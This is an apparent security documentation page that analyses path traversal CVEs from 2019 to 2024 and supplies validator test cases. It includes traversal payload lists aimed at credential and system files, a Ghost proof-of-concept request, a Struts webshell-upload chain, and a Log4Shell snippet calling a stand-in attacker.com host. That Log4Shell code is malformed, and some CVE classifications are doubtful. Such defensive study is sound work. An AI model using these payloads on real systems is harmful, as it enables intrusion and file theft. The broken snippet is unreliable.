= Path Traversal CVE Analysis
:toc: left
:toclevels: 3
:sectnums:
:icons: font

link:../README.adoc[‚Üê Back to Documentation Index]

== Overview

This document analyzes critical path traversal CVEs from 2019-2024, focusing on attack patterns and exploitation techniques relevant for security validation implementation.

== CVEs (2019-2024)

=== 2024 Vulnerabilities

==== CVE-2024-38819 - Spring Framework
[cols="1,3"]
|===
|**CVSS Score** |High (specific score pending)
|**Affected Versions** |Spring WebMvc.fn and WebFlux.fn
|**Attack Vector** |Double URL encoding bypass
|**Impact** |Complete path restriction bypass
|**Exploitation** |`%252e%252e%252f` decoded twice becomes `../`
|**Fix** |Proper handling of multiple encoding layers
|===

**Technical Details:**
[source,java]
----
// Vulnerable pattern
String path = URLDecoder.decode(userInput, "UTF-8");
// After first decode: %2e%2e%2f
// After second decode: ../
----

**Source**: Spring Security Advisory 2024

=== 2023 Vulnerabilities

==== CVE-2023-50164 - Apache Struts 2
[cols="1,3"]
|===
|**CVSS Score** |9.8 (Critical)
|**Affected Versions** |2.0.0-2.3.37, 2.5.0-2.5.32, 6.0.0-6.3.0
|**Attack Vector** |File upload parameter manipulation
|**Impact** |Remote Code Execution via JSP shell upload
|**Exploitation** |Upload malicious JSP to web-accessible directory
|**Patch** |Struts 2.5.33, 6.3.0.2
|===

**Attack Chain:**

1. Identify vulnerable Struts application
2. Craft malicious file upload request
3. Use path traversal to control upload location
4. Upload JSP webshell
5. Access webshell for RCE

**Source**: Apache Struts Security Bulletin S2-066

==== CVE-2023-32235 - Ghost CMS
[cols="1,3"]
|===
|**CVSS Score** |6.5 (Medium)
|**Affected Versions** |Ghost < 5.42.1
|**Attack Vector** |URL-encoded path traversal in asset handling
|**Impact** |Access to sensitive files (package.json, configs)
|**Exploitation** |`/assets/built%2F..%2F..%2F/package.json`
|**Fix** |Ghost 5.42.1
|===

**Proof of Concept:**
[source,http]
----
GET /assets/built%2F..%2F..%2F/package.json HTTP/1.1
Host: vulnerable-ghost.com
----

**Source**: Ghost Security Advisory GHSA-r97q-ghch-82j9

=== 2022 Vulnerabilities

==== CVE-2022-23457 - OWASP ESAPI
[cols="1,3"]
|===
|**CVSS Score** |7.5 (High)
|**Affected Versions** |ESAPI < 2.3.0.0
|**Attack Vector** |Validator.getValidDirectoryPath() bypass
|**Impact** |Complete containment check bypass
|**Exploitation** |Absolute paths bypass parent directory checks
|**Fix** |ESAPI 2.3.0.0
|===

**Vulnerable Code Pattern:**
[source,java]
----
// Vulnerability: Accepts absolute paths
validator.getValidDirectoryPath("test", "/etc/passwd", baseDir, false);
// Returns /etc/passwd instead of throwing exception
----

**Source**: OWASP ESAPI Security Advisory

=== 2021 Vulnerabilities

==== CVE-2021-44228 - Log4Shell (Related Impact)
[cols="1,3"]
|===
|**CVSS Score** |10.0 (Critical)
|**Affected Versions** |Log4j 2.0-beta9 to 2.15.0
|**Attack Vector** |JNDI injection leading to RCE
|**Path Traversal Aspect** |Post-exploitation file system access
|**Impact** |Complete system compromise
|**Fix** |Log4j 2.17.0
|===

**Path Traversal in Exploitation Chain:**
[source,java]
----
// After initial RCE via JNDI
${
    ldap:
//attacker.com/Exploit}
// Payload performs path traversal to access:
    Runtime.exec("cat /etc/passwd");
Runtime.exec("cat ../../config/database.properties
----

==== CVE-2021-29425 - Apache Commons IO
[cols="1,3"]
|===
|**CVSS Score** |4.8 (Medium)
|**Affected Versions** |Commons IO < 2.7
|**Attack Vector** |Malformed paths like `//../foo`
|**Impact** |Limited parent directory access
|**Exploitation** |`FileNameUtils.normalize("//../foo")` returns `//../foo`
|**Fix** |Commons IO 2.7
|===

**Test Case Demonstrating Vulnerability:**
[source,java]
----
// Vulnerable behavior
String normalized = FileNameUtils.normalize("//../foo");
// Expected: null (invalid path)
// Actual: "//../foo" (unchanged, allows traversal)
----

=== 2020 Vulnerabilities

==== CVE-2020-8908 - Google Guava
[cols="1,3"]
|===
|**CVSS Score** |3.3 (Low)
|**Affected Versions** |All Guava versions
|**Attack Vector** |World-readable temp directory permissions
|**Impact** |Information disclosure in multi-user systems
|**Exploitation** |Other users can read temp files
|**Fix** |Method deprecated, use Java NIO
|===

**Vulnerable Pattern:**
[source,java]
----
// Creates directory with permissions 777 on Unix
File tempDir = Files.createTempDir();
// Other users can access: /tmp/guava-user-12345/
----

=== 2019 Vulnerabilities

==== CVE-2019-11358 - jQuery (Path Traversal via Prototype Pollution)
[cols="1,3"]
|===
|**CVSS Score** |6.1 (Medium)
|**Affected Versions** |jQuery < 3.4.0
|**Attack Vector** |Prototype pollution leading to path manipulation
|**Impact** |Client-side path traversal
|**Fix** |jQuery 3.4.0
|===


== Attack Pattern Evolution

=== Traditional Patterns (Pre-2020)
----
../../../etc/passwd
..\..\windows\system32\config\sam
../../../../proc/self/environ
----

=== Modern Patterns (2020-2024)
----
// Double encoding
%252e%252e%252f%252e%252e%252f

// Unicode variants
\u002e\u002e\u002f

// Mixed encoding
..%c0%af..%c0%af

// Null byte injection
../../../../etc/passwd%00.jpg

// Case variation (Windows)
..\\..\\/windows//system32

// URL + HTML encoding
%26%2346%3b%26%2346%3b%26%2347%3b
----

=== Emerging Patterns (2024+)

* Cloud API traversal patterns
* GraphQL query manipulation
* WebSocket path injection
* HTTP/2 and HTTP/3 specific patterns
* REST API path manipulation


== Test Cases from CVEs

[source,java]
----
@Test
public void testCVE_2021_29425_Pattern() {
    // Apache Commons IO vulnerability pattern
    assertThrows(SecurityException.class, () -> 
        validatePath("//../sensitive/file"));
}

@Test
public void testCVE_2023_32235_Encoding() {
    // Ghost CMS URL encoding pattern
    assertThrows(SecurityException.class, () -> 
        validatePath("assets/built%2F..%2F..%2F/config"));
}

@Test
public void testCVE_2023_50164_FileUpload() {
    // Apache Struts upload traversal
    String filename = "../../webapps/shell.jsp";
    assertThrows(SecurityException.class, () -> 
        validateUploadPath(filename));
}

@Test
public void testHttpHeaderInjection() {
    // HTTP header injection pattern
    String header = "X-Original-URL: /../../admin";
    assertThrows(SecurityException.class, () -> 
        validateHttpHeader(header));
}

@Test
public void testDoubleEncoding() {
    // Spring Framework double encoding
    String input = "%252e%252e%252f%252e%252e%252f";
    assertThrows(SecurityException.class, () -> 
        validateAfterDecoding(input));
}
----


== References

=== Vulnerability Databases

* link:https://nvd.nist.gov/[National Vulnerability Database (NVD)]
* link:https://cve.mitre.org/[MITRE CVE Database]
* link:https://www.cisa.gov/known-exploited-vulnerabilities-catalog[CISA Known Exploited Vulnerabilities Catalog]
* link:https://snyk.io/vuln/[Snyk Vulnerability Database]
* link:https://github.com/advisories[GitHub Security Advisories]
* link:https://www.cvedetails.com/[CVE Details]

=== Security Organizations

* link:https://owasp.org/[OWASP - Open Web Application Security Project]
* link:https://cwe.mitre.org/data/definitions/22.html[CWE-22: Path Traversal]
* link:https://attack.mitre.org/[MITRE ATT&CK Framework]

=== Vendor Security Advisories

* link:https://commons.apache.org/security.html[Apache Security]
* link:https://spring.io/security[Spring Security Advisories]
* link:https://github.com/google/guava/wiki/SecurityAdvisories[Google Guava Security]
* link:https://www.atlassian.com/trust/security/advisories[Atlassian Security Advisories]
* link:https://helpx.adobe.com/security.html[Adobe Security Bulletins]

=== Research and Documentation

* link:https://portswigger.net/web-security/file-path-traversal[PortSwigger Web Security Academy]
* link:https://www.sans.org/top25-software-errors/[SANS Top 25 Software Errors]
* link:https://research.checkpoint.com/[Check Point Research]

